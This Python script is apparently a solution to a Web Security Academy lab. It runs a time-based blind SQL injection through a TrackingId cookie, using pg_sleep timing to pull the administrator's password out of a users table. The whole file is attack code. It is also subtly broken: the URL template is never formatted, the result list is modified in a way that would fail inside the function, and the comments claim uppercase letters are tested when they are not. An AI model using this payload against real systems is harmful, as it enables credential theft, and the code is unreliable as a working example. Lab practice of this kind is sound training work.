import sys # Import sys to pass arguments
import requests # Import the requests module to send requests
from urllib.parse import urlparse # Import urlparse to extract the lab ID

if len(sys.argv) != 2 :
    print ("Usage : python3 exploit.py <URL>")
    exit()

# Get URL from user argument
given_url = urlparse(sys.argv[1])  # e.g. "https://515698441354897.web-security-academy.net/"

# Get the hostname
hostname = given_url.hostname  # "515698441354897.web-security-academy.net"

# Extract labID (part before ".")
labID = hostname.split('.')[0]

url = 'https://{labID}.web-security-academy.net/filter?category=Lifestyle' # The URL to send the request to.

data = list() # List to store the found data.

def blind_SQLi():
    # Iterate over the positions of the password characters (assuming a maximum length of 20)
    for pos in range(1, 21):
        print(f'Character number : # {pos} #')  # Print the current character position being tested

        # Iterate over the ASCII values of possible characters (48-122: digits, uppercase, and lowercase letters)
        for char in range(48, 123):
            # Skip non-alphanumeric characters (e.g., special characters between digits and letters)
            if (char > 57 and char < 97):
                continue

            # Construct the SQL injection payload to test if the character at the current position matches
            payload = f"'%3BSELECT CASE WHEN (SUBSTRING(password, {pos},1) = '{chr(char)}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"

            # Add the payload to the 'TrackingId' cookie
            header = {
                'Cookie': "TrackingId=abc" + payload
            }

            # Send the HTTP GET request with the malicious header
            response = requests.get(url, headers=header)

            # Check if the server's response time indicates a match (greater than 2.9 seconds)
            if response.elapsed.total_seconds() > 2.9:
                print(f'Found! : {chr(char)}')  # Print the matched character
                data += chr(char)  # Add the matched character to the password list
                break  # Exit the loop for the current position
            else:
                print(f'Invalid: {chr(char)}')  # Print the invalid character being tested

    # Print the final extracted password
    print(f'Password : {"".join(data)}')

blind_SQLi() # Call the function to start
